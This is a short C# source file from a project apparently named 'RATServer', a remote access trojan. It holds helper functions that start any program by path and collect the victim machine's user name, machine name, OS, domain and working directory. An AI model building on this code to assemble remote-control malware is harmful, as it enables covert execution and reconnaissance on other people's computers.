using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RATServer
{
    public class Functions
    {
        public static void Message(string Msg)
        {
            Console.WriteLine(Msg);
        }
        public static void Run(string Path)
        {
            System.Diagnostics.Process.Start(Path);
        }
        public static string PCInfo()
        {
            string x;
            x = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
            return x;
        }
    }
}
